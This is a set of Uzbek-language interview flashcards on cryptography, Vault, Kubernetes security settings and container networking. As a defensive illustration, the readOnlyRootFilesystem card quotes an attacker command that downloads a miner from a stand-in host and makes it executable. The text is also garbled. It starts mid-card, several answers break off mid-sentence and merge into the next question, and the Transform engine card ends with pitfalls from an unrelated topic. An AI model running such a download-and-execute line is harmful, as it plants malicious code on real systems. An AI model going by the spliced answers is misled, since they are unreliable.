/etc/ssl/rsa.key;</pre><p><b>Tuzoqlar:</b></p><ul><li>ECDSA imzolashda tasodifiy <code>k</code> takrorlansa yoki zaif bo'lsa — private kalit tiklanadi (Sony PS3 holati). Ishonchli kutubxona ishlating; Ed25519 deterministik — bu xavf yo'q.</li><li>Ba'zi HSM/eski Java/embedded client'lar Ed25519'ni qo'llamaydi.</li><li>Ikkalasi ham kvant kompyuterga (Shor) qarshi zaif — PQC kelajagi.</li></ul><p><b>Senior nuqta:</b> Yangi tizimlar uchun default: TLS sertifikati ECDSA P-256, SSH va ichki imzolar Ed25519, kalit almashinuvi X25519 (+ hybrid ML-KEM). RSA faqat moslik uchun.</p>	lvl::Senior dom::net sec::h31 DevSecOps_cryptography
Interview Drill::Networking::H31 DevSecOps & cryptography	idrill-41993	<p>ChaCha20-Poly1305 nima?</p>	<p><b>Qisqa javob:</b> ChaCha20-Poly1305 — AEAD (shifrlash + autentifikatsiya) algoritmi: ChaCha20 stream cipher maxfiylikni, Poly1305 MAC yaxlitlikni ta'minlaydi (RFC 8439). U faqat oddiy CPU amallari (qo'shish, XOR, siljitish) ishlatadi — AES hardware tezlatkichi (AES-NI) yo'q qurilmalarda AES-GCM'dan ancha tez va <b>constant-time</b> (timing hujumlariga chidamli).</p><p><b>Muammo:</b> AES dasturiy ta'minotda sekin va jadval lookup'lari tufayli cache-timing hujumlariga zaif. Eski Android telefonlar, IoT, ba'zi ARM chiplarda AES-NI yo'q — AES-GCM batareya va tezlikni yeydi.</p><p><b>Qanday ishlaydi:</b></p><pre>key(256b) + nonce(96b) + counter -&gt; ChaCha20 blok funksiyasi (20 round ARX) -&gt; keystream<br>ciphertext = plaintext XOR keystream<br>tag = Poly1305(one-time key (keystream'dan), AAD + ciphertext)<br>Qabul qiluvchi: tag tekshir -&gt; mos emas -&gt; rad (shifrni ochmasdan)</pre><p><b>Amalda:</b></p><pre>openssl speed -evp chacha20-poly1305 -evp aes-256-gcm   # o'z hardware'ingizda<br>openssl s_client -connect example.com:443 -ciphersuites TLS_CHACHA20_POLY1305_SHA256 &lt;/dev/null | grep Cipher</pre><p>TLS 1.3 cipher suite'lari: <code>TLS_AES_128_GCM_SHA256</code>, <code>TLS_AES_256_GCM_SHA384</code>, <code>TLS_CHACHA20_POLY1305_SHA256</code>. Server odatda client AES-NI'ga ega bo'lmasa (client ro'yxatida ChaCha birinchi bo'lsa) ChaCha'ni tanlaydi — BoringSSL/OpenSSL <code>prioritize_chacha</code>. Ishlatiladi: TLS, WireGuard, SSH (<code>chacha20-poly1305@openssh.com</code>), age, Signal.</p><p><b>Tuzoqlar:</b></p><ul><li><b>Nonce takrorlanishi</b> bir xil kalit bilan — halokatli: keystream fosh bo'ladi va MAC soxtalashtiriladi. Tasodifiy nonce uchun XChaCha20 (192-bit nonce) xavfsizroq.</li><li>O'z kriptografiyangizni yig'ish (ChaCha20 + alohida HMAC) — tayyor AEAD API (libsodium, Go <code>x/crypto/chacha20poly1305</code>) ishlating.</li><li>AES-NI bor server'larda AES-GCM tezroq — &quot;ChaCha har doim yaxshi&quot; emas.</li></ul><p><b>Senior nuqta:</b> Tanlov hardware'ga bog'liq: server-server — AES-GCM; mobil client'lar ko'p — ChaCha20'ni ham qo'llab-quvvatlang. Asosiy xavf algoritmda emas, nonce va kalit boshqaruvida.</p>	lvl::Senior dom::net sec::h31 DevSecOps_cryptography
Interview Drill::Networking::H31 DevSecOps & cryptography	idrill-41994	<p>Post-quantum kriptografiya nima?</p>	<p><b>Qisqa javob:</b> Post-quantum kriptografiya (PQC) — klassik kompyuterlarda ishlaydigan, lekin kelajakdagi kvant kompyuterlar hujumiga ham chidamli algoritmlar. NIST 2024-yil avgustda standartladi: <b>ML-KEM</b> (FIPS 203, avval Kyber) — kalit almashinuvi; <b>ML-DSA</b> (FIPS 204, Dilithium) va <b>SLH-DSA</b> (FIPS 205, SPHINCS+) — imzolar. TLS'da hybrid <code>X25519MLKEM768</code> allaqachon Chrome, Firefox, Cloudflare, OpenSSL 3.5 da default.</p><p><b>Muammo:</b> Shor algoritmi yetarlicha katta kvant kompyuterda RSA, DH, ECDSA, ECDH'ni buzadi. U hali yo'q, lekin <b>&quot;harvest now, decrypt later&quot;</b>: hujumchi bugun shifrlangan trafikni yozib saqlaydi, 10-15 yildan keyin ochadi. 20 yil maxfiy qolishi kerak bo'lgan ma'lumot (tibbiy, davlat, moliya) uchun xavf bugundan boshlanadi.</p><p><b>Qanday ishlaydi:</b></p><pre>Hybrid kalit almashinuvi (TLS 1.3):<br>  ClientHello key_share: X25519 public || ML-KEM-768 encapsulation key  (~1.2 KB)<br>  ServerHello:           X25519 public || ML-KEM ciphertext<br>  shared = KDF( X25519_secret || MLKEM_secret )<br>Ikkalasidan biri buzilsa ham secret xavfsiz (klassik + PQ)<br>Simmetrik (AES-256, SHA-384) — Grover faqat kvadrat ildiz beradi -&gt; kalitni 256 bit qilish yetarli</pre><p><b>Amalda:</b></p><pre>openssl version                                    # 3.5+ ML-KEM native<br>openssl s_client -connect cloudflare.com:443 -groups X25519MLKEM768 &lt;/dev/null 2&gt;&amp;1 | grep -i 'negotiated group'<br>ssh -Q kex | grep -i mlkem                         # OpenSSH 10: mlkem768x25519-sha256 default</pre><p>Chrome DevTools &gt; Security: &quot;X25519MLKEM768&quot;.</p><p><b>Tuzoqlar:</b></p><ul><li>Katta key share ClientHello'ni bir paketdan kattalashtiradi — eski middlebox/firewall'lar ulanishni uzadi (real outage'lar bo'lgan).</li><li>PQ imzolar (sertifikatlar) hali keng joriy qilinmagan — imzo hajmi katta (ML-DSA ~2.4 KB), WebPKI'ga o'tish keyingi yillar ishi.</li><li>&quot;Faqat PQ&quot; (hybrid'siz) erta — algoritmlar nisbatan yangi.</li></ul><p><b>Senior nuqta:</b> Hozirgi vazifa — <b>crypto agility</b> va inventarizatsiya: qayerda RSA/ECC ishlatiladi, qaysi ma'lumot uzoq yashaydi. Kalit almashinuvini hybrid'ga bugun o'tkazing (arzon), imzolarni rejalashtiring. NIST 2030-2035 da klassik algoritmlarni deprecate qilishni rejalashtirgan.</p>	lvl::Senior dom::net sec::h31 DevSecOps_cryptography
Interview Drill::Networking::H31 DevSecOps & cryptography	idrill-41995	<p>DHE / ECDHE nima?</p>	<p><b>Qisqa javob:</b> DHE (Diffie-Hellman Ephemeral) va ECDHE (Elliptic Curve DHE) — ikki tomon ochiq kanal orqali faqat public qiymatlar almashib, <b>umumiy secret</b> hosil qiladigan kalit almashinuvi; &quot;Ephemeral&quot; — har sessiyada yangi kalit juftligi, shuning uchun forward secrecy beradi. ECDHE (X25519, P-256) DHE'dan ancha tez va kichik. TLS 1.3 da faqat (EC)DHE qolgan.</p><p><b>Muammo:</b> Ikki tomon hech qachon uchrashmagan, umumiy kalit yo'q, kanalni hujumchi tinglaydi. Qanday qilib faqat ular biladigan simmetrik kalit kelishiladi?</p><p><b>Qanday ishlaydi:</b></p><pre>Umumiy parametrlar: egri chiziq va G nuqtasi (ochiq)<br>Alice: a tasodifiy (sir)  -&gt;  A = a*G  -----&gt;  ochiq<br>Bob:   b tasodifiy (sir)  &lt;-  B = b*G  &lt;-----  ochiq<br>Alice: a*B = a*b*G       Bob: b*A = a*b*G   -&gt; bir xil secret<br>Tinglovchi A va B ni ko'radi, lekin a*b*G ni hisoblay olmaydi (ECDLP qiyin)<br>MitM'ga qarshi: server o'z B'sini sertifikat kaliti bilan IMZOLAYDI</pre><p><b>Amalda:</b></p><pre>openssl s_client -connect example.com:443 &lt;/dev/null 2&gt;/dev/null | grep -E 'Server Temp Key|Negotiated'<br># Server Temp Key: X25519, 253 bits<br>openssl genpkey -algorithm X25519 -out a.key &amp;&amp; openssl pkey -in a.key -pubout -out a.pub<br>openssl genpkey -algorithm X25519 -out b.key &amp;&amp; openssl pkey -in b.key -pubout -out b.pub<br>openssl pkeyutl -derive -inkey a.key -peerkey b.pub | xxd | head -1<br>openssl pkeyutl -derive -inkey b.key -peerkey a.pub | xxd | head -1   # bir xil!</pre><p>nginx (TLS 1.2/1.3): <code>ssl_ecdh_curve X25519MLKEM768:X25519:prime256v1;</code></p><p><b>Tuzoqlar:</b></p><ul><li>Klassik DHE kichik guruh bilan (512/1024 bit) — Logjam hujumi; DHE ishlatsangiz kamida 2048-bit RFC 7919 guruhlari, yaxshisi faqat ECDHE.</li><li>Imzosiz (anonim) DH — MitM'ga to'liq ochiq.</li><li>Statik DH (ECDH, &quot;E&quot;siz) — forward secrecy yo'q.</li></ul><p><b>Senior nuqta:</b> Bugungi default: X25519 (va hybrid X25519MLKEM768). DHE'ni TLS 1.2 konfiguratsiyasidan olib tashlash xavfsiz va handshake'ni tezlashtiradi.</p>	lvl::Senior dom::net sec::h31 DevSecOps_cryptography
Interview Drill::Networking::H31 DevSecOps & cryptography	idrill-41996	<p>HSM (Hardware Security Module) nima?</p>	<p><b>Qisqa javob:</b> HSM (Hardware Security Module) — kriptografik kalitlarni buzilishga chidamli maxsus hardware ichida <b>generatsiya qiladigan, saqlaydigan va ishlatadigan</b> qurilma. Interview Drill::Networking::H31 DevSecOps & cryptography	idrill-41998	<p>Zero-Knowledge Proof (ZKP) nima?</p>	<p><b>Qisqa javob:</b> Zero-Knowledge Proof (ZKP) — prover verifier'ga &quot;bu bayonot rost&quot; ekanini isbotlaydi, lekin rostligidan <b>boshqa hech qanday</b> ma'lumot oshkor qilmaydi. Uch xossa: completeness (rost bo'lsa isbot qabul qilinadi), soundness (yolg'onni isbotlab bo'lmaydi), zero-knowledge (verifier sirni bilib olmaydi).</p><p><b>Muammo:</b> &quot;Men 18 yoshdan kattaman&quot; deyish uchun pasportni (tug'ilgan sana, manzil, raqam) to'liq ko'rsatasiz. &quot;Parolni bilaman&quot; deyish uchun parolni server'ga yuborasiz — server buzilsa parol sizadi. Kerak bo'lgani faqat <b>fakt</b>, ma'lumot emas.</p><p><b>Intuitiv misol (g'or):</b></p><pre>       kirish<br>         |<br>    +----+----+<br>    A         B      ichkarida sehrli eshik A&lt;-&gt;B (parol bilan ochiladi)<br>    +--[eshik]+<br>Prover tasodifiy A yoki B ga kiradi. Verifier: &quot;B dan chiq!&quot; deydi.<br>Parolni bilsa — har doim chiqadi. Bilmasa — 50% omad.<br>20 raund -&gt; yolg'on ehtimoli 1/2^20 ~ 0.000001. Verifier parolni o'rganmadi.</pre><p><b>Turlari va amaliyot:</b> | Tur | Xususiyat | Qo'llanish | |---|---|---| | zk-SNARK (Groth16, PLONK) | Isbot kichik (~200 B), trusted setup (ba'zilarida) | Zcash, zkRollup'lar | | zk-STARK | Trusted setup yo'q, PQ-xavfsiz, isbot katta | StarkNet | | Schnorr / Sigma protokollar | Oddiy, interaktiv -&gt; Fiat-Shamir | Identifikatsiya | | PAKE (OPAQUE) | Parol server'ga yuborilmaydi | Parolli login |</p><p>Real qo'llanishlar: zkRollup'lar (Ethereum masshtablash), Google Wallet'dagi yoshni ZKP bilan tasdiqlash (2025), anonim credential'lar (EU Digital Identity Wallet), Cloudflare Privacy Pass.</p><p><b>Tuzoqlar:</b></p><ul><li>&quot;ZKP = maxfiylik kafolati&quot; — tizimning boshqa qismlari (metadata, IP, vaqt) baribir oshkor qilishi mumkin.</li><li>Circuit'dagi bug (cheklov yetishmasa) — soxta isbot qabul qilinadi; zk loyihalarda real hack'lar shu sababli.</li><li>Prover hisoblashi qimmat (sekundlar-minutlar) — har so'rov uchun mos emas.</li></ul><p><b>Senior nuqta:</b> DevOps muhandisi ZKP'ni o'zi yozmaydi, lekin &quot;minimal disclosure&quot; g'oyasini tushunishi kerak: identity va compliance dizaynida &quot;ma'lumotni yig'masdan faktni tekshirish&quot; mumkinmi — so'rang. Saqlanmagan ma'lumot sizib chiqmaydi.</p>	lvl::Senior dom::net sec::h31 DevSecOps_cryptography
Interview Drill::Networking::H31 DevSecOps & cryptography	idrill-41999	<p>Vault KV v2 secrets engine nima?</p>	<p><b>Qisqa javob:</b> KV v2 — Vault'ning <b>versiyalangan</b> key-value secrets engine'i: har yozish yangi versiya yaratadi (default 10 versiya saqlanadi), eski versiyani o'qish va tiklash (<code>rollback</code>), soft delete / <code>undelete</code>, butunlay yo'q qilish (<code>destroy</code>) va <b>check-and-set (CAS)</b> bilan bir vaqtdagi yozishlarning bir-birini o'chirishidan himoya.</p><p><b>Muammo:</b> KV v1'da kimdir DB parolini xato qiymat bilan qayta yozdi — eski qiymat abadiy yo'qoldi, servislar ishlamay qoldi. Lekin eng yaxshi KV secret — o'rnini dynamic credential egallagani.</p>	lvl::Senior dom::net sec::h31 DevSecOps_cryptography

Interview Drill::Networking::H31 DevSecOps & cryptography	idrill-42001	<p>Vault token TTL va Max TTL farqi.</p>	<p><b>Qisqa javob:</b> | | TTL | Max TTL | |---|---|---| | Ma'nosi | Joriy amal qilish muddati | Mutlaq umr chegarasi (yaratilishdan) | | Renew | <code>renew</code> bilan uzaytiriladi | Uzaytirib bo'lmaydi | | Tugaganda | Renew qilinmasa token o'ladi | Renew qilinsa ham o'ladi -&gt; qayta login | Effektiv qiymat: auth method/role sozlamasi &lt; mount tune &lt; system default (<code>768h</code> = 32 kun).</p><p><b>Muammo:</b> Token cheksiz uzaytirilsa — o'g'irlangan token ham cheksiz ishlaydi. Ikkita parametr balans beradi: tez-tez &quot;tiriklik isboti&quot; (TTL) va qattiq yuqori chegara (Max TTL).</p><p><b>Qanday ishlaydi:</b></p><pre>token yaratildi t=0, ttl=1h, max_ttl=24h<br>t=50m  renew -&gt; TTL yana 1h (t=1h50m gacha)<br>...<br>t=23h30m renew -&gt; faqat t=24h gacha uzaytiriladi (cap)<br>t=24h  token revoke -&gt; ilova auth/... login qilib YANGI token oladi<br>Token o'lsa — undan yaratilgan child token'lar va lease'lar ham revoke</pre><p><b>Amalda:</b></p><pre>vault write auth/approle/role/web token_ttl=1h token_max_ttl=24h<br>vault token create -ttl=1h -explicit-max-ttl=8h -policy=web<br>vault token lookup                   # ttl, creation_ttl, explicit_max_ttl, expire_time<br>vault token renew -increment=1h<br>vault secrets tune -max-lease-ttl=72h database/<br>vault read sys/auth/approle/tune     # mount darajasidagi default/max</pre><p><b>Tuzoqlar:</b></p><ul><li>Ilova renew qiladi, lekin Max TTL'dan keyin qayta login logikasi yo'q — har 24 soatda to'satdan <code>403 permission denied</code> (klassik &quot;har kuni tunda sinadi&quot;).</li><li>System default 32 kun — role'da TTL qo'yilmasa token'lar keraksiz uzoq yashaydi.</li><li><code>explicit-max-ttl</code> va mount <code>max_ttl</code> ikkalasi bo'lsa — eng kichigi ishlaydi.</li></ul><p><b>Senior nuqta:</b> Qo'lda renew/re-login yozmang — Vault Agent, VSO yoki SDK <code>LifetimeWatcher</code> buni to'g'ri qiladi. Production qoida: qisqa TTL (minut-soat), Max TTL bir kundan oshmasin.</p>	lvl::Senior dom::net sec::h31 DevSecOps_cryptography
Interview Drill::Networking::H31 DevSecOps & cryptography	idrill-42002	<p>Vault periodic token nima?</p>	<p><b>Qisqa javob:</b> Periodic token — <b>Max TTL'ga ega bo'lmagan</b> token: har renew'da TTL <code>period</code> qiymatiga qaytariladi va belgilangan davr ichida renew qilib turilsa <b>cheksiz</b> yashaydi. Renew to'xtasa — <code>period</code> o'tgach o'ladi. Uzoq yashovchi servislar (qayta login qila olmaydigan) uchun.</p><p><b>Muammo:</b> Eski monolit yoki uchinchi tomon tizimi Vault'ga faqat bitta token bilan ulanadi va qayta login mexanizmini qo'llamaydi. Interview Drill::Networking::H31 DevSecOps & cryptography	idrill-42003	<p>Vault entity va alias nima?</p>	<p><b>Qisqa javob:</b> <b>Entity</b> — Vault ichidagi bitta haqiqiy shaxs yoki servisning yagona identity'si. <b>Alias</b> — o'sha entity'ning ma'lum auth method'dagi &quot;akkaunti&quot; (masalan GitHub'dagi <code>alice</code>, Okta'dagi <code>alice@corp.com</code>, LDAP'dagi <code>alice</code>). Interview Drill::Networking::H31 DevSecOps & cryptography	idrill-42005	<p>Vault Transform secrets engine nima?</p>	<p><b>Qisqa javob:</b> Transform secrets engine (Vault Enterprise, ADP modul) — sezgir ma'lumotlarni ilova uchun <b>formatini saqlagan holda</b> himoyalash: <b>FPE</b> (Format-Preserving Encryption, NIST FF3-1) — 16 raqamli karta raqami yana 16 raqamli qiymatga shifrlanadi; <b>tokenization</b> — qiymat tasodifiy token bilan almashtiriladi va xaritalash Vault'da saqlanadi; <b>masking</b> — qaytarib bo'lmaydigan niqoblash.</p><p><b>Muammo:</b> PCI DSS: karta raqami (PAN) saqlanadigan har tizim audit doirasiga kiradi. Oddiy AES shifrlash <code>base64</code> blob beradi — sxema sinadi.</p><p><b>Qanday ishlaydi:</b></p><pre>FPE:      4111-1111-1111-1111 --encode--&gt; 8492-0371-5528-1111 (oxirgi 4 raqam saqlangan)<br>          kalit Vault'da, decode qaytaradi; DB'da faqat shifrlangan, lekin bir xil format<br>Tokenize: 4111... --&gt; &quot;tok_9f3a...&quot; ; xaritalash Vault storage'da (yoki tashqi DB), TTL, metadata<br>          tokendan matematik yo'l bilan asl qiymatni tiklab bo'lmaydi<br>Masking:  4111111111111111 --&gt; ############1111  (qaytarilmaydi)</pre><p><b>Amalda:</b></p><pre>vault secrets enable transform<br>vault write transform/role/payments transformations=card-fpe<br>vault write transform/transformations/fpe/card-fpe \<br>  template=builtin/creditcardnumber tweak_source=internal allowed_roles=payments<br>vault write transform/encode/payments value=4111-1111-1111-1111 transformation=card-fpe<br># encoded_value: 7685-1442-6183-1111<br>vault write transform/decode/payments value=7685-1442-6183-1111 transformation=card-fpe</pre><p>Open-source muqobil: Transit engine (format saqlanmaydi, lekin kalit Vault'da).</p><p><b>Tuzoqlar:</b></p><ul><li>FPE'da kichik domen (masalan 4 xonali PIN) — brute-force oson; FF3-1 minimal domen talablariga rioya qiling.</li><li>Tokenization xaritalash storage'i — o'zi yuqori qiymatli nishon va masshtab muammosi (milliardlab token).</li><li>PCI doirasini kamaytirish — auditor bilan oldindan kelishing; &quot;Vault ishlatamiz&quot; avtomatik descoping emas.</li></ul><p><b>Senior nuqta:</b> Tanlov: ma'lumotni qaytarish kerakmi (FPE/token) yoki yo'qmi (mask/hash); sxemani o'zgartira olasizmi (Transit yetarli) yoki yo'q (FPE). Yangi integratsiyalarni gRPC'ga qurmang.</p><p><b>Tuzoqlar:</b></p><ul><li>TCP bind'ni mTLS'siz ochish — istalgan pod alert oqimini (sezgir ma'lumot) o'qiydi.</li><li>Client sekin bo'lsa alert'lar yo'qolishi mumkin; avtomatik remediation'da idempotentlik va dry-run kerak.</li></ul><p><b>Senior nuqta:</b> Avtomatik javob kuchli, lekin xavfli: false positive prod pod'ini o'ldiradi. Avval faqat &quot;kuchli signal&quot;li qoidalar (masalan canary fayl o'qildi) uchun avtomatlashtiring, qolganida inson tasdig'i.</p>	lvl::Senior dom::net sec::h31 DevSecOps_cryptography

Interview Drill::Networking::H31 DevSecOps & cryptography	idrill-42011	<p><code>readOnlyRootFilesystem: true</code> nima beradi?</p>	<p><b>Qisqa javob:</b> <code>readOnlyRootFilesystem: true</code> — container'ning root fayl tizimi (image qatlamlari ustidagi yozish qatlami) <b>faqat o'qish</b> uchun mount qilinadi. Hujumchi RCE olsa ham <code>/bin</code>, <code>/usr</code>, <code>/app</code> ga backdoor, web shell yoki crypto-miner binary yoza olmaydi. Ilovaga yozish kerak bo'lgan joylar (<code>/tmp</code>, cache) alohida <code>emptyDir</code> sifatida beriladi.</p><p><b>Muammo:</b> Real hujumlar: RCE -&gt; <code>curl evil/miner -o /tmp/x &amp;&amp; chmod +x</code> yoki web root'ga <code>shell.php</code> yozish. Shuningdek, ishlab turgan container'da kimdir qo'lda &quot;tuzatish&quot; qilsa — image va real holat farqlanadi (drift).</p><p><b>Qanday ishlaydi:</b></p><pre>container root fs (overlayfs, ro)<br>   /app        ro  -&gt; yozishga urinish: EROFS &quot;Read-only file system&quot;<br>   /tmp        emptyDir (rw, xotirada yoki diskda, pod bilan o'ladi)<br>   /var/cache/nginx  emptyDir (rw)</pre><p><b>Amalda:</b></p><pre>spec:<br>  containers:<br>    - name: api<br>      image: ghcr.io/org/api@sha256:...<br>      securityContext:<br>        readOnlyRootFilesystem: true<br>        runAsNonRoot: true<br>        allowPrivilegeEscalation: false<br>        capabilities: { drop: [&quot;ALL&quot;] }<br>      volumeMounts:<br>        - { name: tmp, mountPath: /tmp }<br>  volumes:<br>    - name: tmp<br>      emptyDir: { medium: Memory, sizeLimit: 64Mi }</pre><pre>kubectl exec deploy/api -- touch /app/x    # touch: /app/x: Read-only file system<br>docker run --read-only --tmpfs /tmp nginx  # Docker ekvivalenti</pre><p>Qaysi yo'llarga yozilishini aniqlash: avval <code>--read-only</code>siz ishga tushirib <code>docker diff &lt;container&gt;</code>.</p><p><b>Tuzoqlar:</b></p><ul><li>nginx, Java (<code>/tmp</code> JIT), Python (<code>__pycache__</code>), Rails (<code>tmp/pids</code>) — yozish joylari kerak; emptyDir qo'shmasangiz crash.</li><li><code>emptyDir</code> ichiga baribir binary yozib ishga tushirish mumkin — <code>noexec</code> uchun K8s'da to'g'ridan-to'g'ri opsiya yo'q; seccomp/AppArmor va non-root bilan birga ishlating.</li><li><code>medium: Memory</code> emptyDir pod memory limit'iga hisoblanadi — OOMKill.</li></ul><p><b>Senior nuqta:</b> Read-only root fs — immutable infratuzilma tamoyilining container darajasidagi ifodasi: o'zgarish faqat yangi image orqali. Distroless image bilan birga hujumchining &quot;qo'lidagi tool'lar&quot;ni deyarli nolga tushiradi.</p>	lvl::Senior dom::net sec::h31 DevSecOps_cryptography
Interview Drill::Networking::H31 DevSecOps & cryptography	idrill-42012	<p><code>allowPrivilegeEscalation: false</code> nima?</p>	<p><b>Qisqa javob:</b> <code>allowPrivilegeEscalation: false</code> — container process'iga Linux <code>no_new_privs</code> flag'ini o'rnatadi: process va uning barcha child'lari <b>o'zidan ko'p huquq ololmaydi</b>. Ya'ni setuid/setgid binary'lar (<code>sudo</code>, <code>su</code>, <code>ping</code>ning eski versiyasi) ishga tushganda root bo'lmaydi va fayl capability'lari qo'shilmaydi.</p><p><b>Muammo:</b> Container <code>runAsUser: 1000</code> bilan ishlaydi — yaxshi. Lekin image ichida setuid root binary qolgan (yoki hujumchi zaif setuid tool'dan foydalanadi) — <code>execve</code> paytida kernel effektiv UID'ni 0 qiladi va non-root himoyasi bekor bo'ladi.</p><p><b>Qanday ishlaydi:</b></p><pre>no_new_privs = 0:  uid 1000 -&gt; execve(/usr/bin/sudo, setuid root) -&gt; euid 0  (eskalatsiya)<br>no_new_privs = 1:  uid 1000 -&gt; execve(/usr/bin/sudo)               -&gt; euid 1000 qoladi<br>                   fayl capability'lari ham e'tiborsiz; flag meros qoladi, qaytarib bo'lmaydi</pre><p>K8s'da <code>privileged: true</code> yoki <code>CAP_SYS_ADMIN</code> bo'lsa bu sozlama baribir <code>true</code> deb hisoblanadi (ma'nosiz).</p><p><b>Amalda:</b></p><pre>securityContext:<br>  runAsNonRoot: true<br>  runAsUser: 10001<br>  allowPrivilegeEscalation: false<br>  capabilities: { drop: [&quot;ALL&quot;] }<br>  seccompProfile: { type: RuntimeDefault }</pre><pre>kubectl exec deploy/api -- grep NoNewPrivs /proc/1/status    # NoNewPrivs: 1<br>docker run --security-opt no-new-privileges:true app<br># image'dagi setuid fayllarni topish<br>docker run --rm --entrypoint sh app -c 'find / -perm -4000 -type f 2&gt;/dev/null'</pre><p><b>Tuzoqlar:</b></p><ul><li>Default qiymat <code>true</code> (ruxsat) — ochiq yozmasangiz himoya yo'q. PSS <code>restricted</code> uni <code>false</code> bo'lishini talab qiladi.</li><li>Ilova ichida <code>sudo</code> ishlatadigan entrypoint skriptlar sinadi — bu image dizayni muammosi, sozlama emas.</li><li>Bu flag allaqachon root bo'lgan process'ni cheklamaydi — <code>runAsNonRoot</code> bilan birga ma'noli.</li></ul><p><b>Senior nuqta:</b> Bu &quot;deyarli bepul&quot; himoya: oddiy ilovalarga ta'siri nol, setuid asosidagi eskalatsiya sinfini butunlay yopadi. Kyverno/PSA bilan klaster bo'yicha majburiy qiling.</p>	lvl::Senior dom::net sec::h31 DevSecOps_cryptography
Interview Drill::Networking::H31 DevSecOps & cryptography	idrill-42013	<p>Container tarmog'ida veth pair nima?</p>	<p><b>Qisqa javob:</b> veth (virtual Ethernet) pair — ikki uchli virtual &quot;kabel&quot;: bir uchiga yuborilgan paket darhol ikkinchi uchidan chiqadi. Bir uchi container'ning <b>network namespace</b>'ida (<code>eth0</code> deb ataladi), ikkinchisi host namespace'ida (<code>vethXXXX</code> yoki Calico'da <code>caliXXXX</code>) — bridge'ga yoki host routing'ga ulanadi. Container shu orqali tashqi dunyo bilan gaplashadi.</p><p><b>Muammo:</b> Network namespace — to'liq izolyatsiyalangan tarmoq stack'i (o'z interfeyslari, route, iptables). Yangi namespace'da faqat <code>lo</code> bor — tashqariga chiqish yo'li yo'q. Ikki namespace'ni ulash uchun &quot;teshik&quot; kerak.</p><p><b>Qanday ishlaydi:</b></p><pre>+-------- container netns --------+        +----------- host netns ------------+<br>| eth0 172.17.0.2  &lt;=== veth ===&gt; | vethab12 --&gt; docker0 (bridge 172.17.0.1)  |<br>+---------------------------------+        |                 |  NAT (MASQUERADE)|<br>                                           |               eth0 (fizik)        |<br>                                           +-----------------------------------+<br>Calico/Cilium: bridge yo'q — host route: 10.244.1.5 dev cali123 (L3 routing)</pre><p><b>Amalda (qo'lda yaratish):</b></p><pre>ip netns add demo<br>ip link add veth-host type veth peer name veth-ctr<br>ip link set veth-ctr netns demo<br>ip netns exec demo ip addr add 10.200.0.2/24 dev veth-ctr<br>ip netns exec demo ip link set veth-ctr up<br>ip addr add 10.200.0.1/24 dev veth-host &amp;&amp; ip link set veth-host up<br>ip netns exec demo ping -c1 10.200.0.1</pre><p>Pod'ning host tarafdagi veth'ini topish:</p><pre>kubectl exec pod -- cat /sys/class/net/eth0/iflink     # masalan 17<br>ip -o link | grep '^17:'                               # 17: cali3f2a...@if3</pre><p><b>Tuzoqlar:</b></p><ul><li>MTU nomuvofiqligi: veth MTU 1500, overlay (VXLAN) esa 1450 kerak — katta paketlar yo'qoladi.</li><li>Host'dagi veth'larda <code>tcpdump</code> — pod trafikini aynan shu yerda tutish eng oson; nomini topa olmaslik debug'ni sekinlashtiradi.</li><li>Container o'chganda veth avtomatik o'chadi; o'chmay qolgan &quot;yetim&quot; veth'lar — CNI bug belgisi.</li></ul><p><b>Senior nuqta:</b> Pod tarmog'ini debug qilish xaritasi: pod <code>eth0</code> -&gt; host veth -&gt; bridge/route -&gt; iptables/eBPF -&gt; node <code>eth0</code>. Har bo'g'inda <code>tcpdump</code> qilib paket qayerda yo'qolishini aniqlang.</p>	lvl::Senior dom::net sec::h31 DevSecOps_cryptography
Interview Drill::Networking::H31 DevSecOps & cryptography	idrill-42014	<p>Container tarmog'ida Linux bridge nima?</p>	<p><b>Qisqa javob:</b> Linux bridge — kernel'dagi dasturiy <b>L2 switch</b>: unga ulangan interfeyslar (container veth'lari, fizik NIC, tap) orasida Ethernet frame'larni MAC manzil jadvali (FDB) asosida uzatadi. Docker'ning <code>docker0</code>, CNI <code>bridge</code> plugin'ining <code>cni0</code>, KVM'ning <code>br0</code> — barchasi Linux bridge. Boshqaruv: <code>ip link</code> va <code>bridge</code> buyruqlari (<code>brctl</code> eskirgan, bridge-utils).</p><p><b>Muammo:</b> Bitta host'da 30 ta container — har biri o'z veth'i bilan. Ular bir-biri bilan va tashqi dunyo bilan qanday gaplashadi? Har juftga alohida kabel imkonsiz — umumiy switch kerak.</p><p><b>Qanday ishlaydi:</b></p><pre>container A (172.17.0.2) --veth-- +<br>container B (172.17.0.3) --veth-- +-- docker0 bridge (172.17.0.1, gateway)<br>container C (172.17.0.4) --veth-- +         |<br>                                   L3 routing + iptables NAT (MASQUERADE)<br>                                            |<br>                                         eth0 -&gt; internet<br>A -&gt; B: bridge FDB bo'yicha to'g'ridan-to'g'ri (L2)<br>A -&gt; internet: default gw 172.17.0.1 -&gt; host routing -&gt; SNAT</pre><p><b>Amalda:</b></p><pre>ip link add br-demo type bridge<br>ip link set br-demo up<br>ip addr add 10.10.0.1/24 dev br-demo<br>ip link set veth-host master br-demo<br>bridge link show                        # qaysi portlar ulangan<br>bridge fdb show br docker0              # MAC jadvali<br>ip -d link show docker0                 # stp, vlan_filtering ...<br>sysctl net.bridge.bridge-nf-call-iptables    # K8s uchun 1 bo'lishi shart</pre><p><b>Tuzoqlar:</b></p><ul><li><code>br_netfilter</code> moduli yuklanmagan yoki <code>bridge-nf-call-iptables=0</code> — bridge orqali o'tgan trafik iptables'dan o'tmaydi; kube-proxy Service'lari ishlamaydi (K8s o'rnatishdagi klassik qadam).</li><li>Fizik NIC'ni bridge'ga qo'shganda IP manzilni NIC'dan bridge'ga ko'chirmaslik — SSH ulanishi uziladi.</li><li>Docker bridge tarmog'i ichki korporativ subnet (172.17.0.0/16) bilan to'qnashadi — <code>daemon.json</code> da <code>bip</code> va <code>default-address-pools</code>.</li></ul><p><b>Senior nuqta:</b> Bridge — oddiy va ishonchli, lekin katta klasterlarda ko'p CNI'lar (Calico, Cilium) bridge'siz <b>L3 routing</b> tanlaydi: broadcast domeni yo'q, ARP shovqini yo'q, debug soddaroq.</p>	lvl::Senior dom::net sec::h31 DevSecOps_cryptography
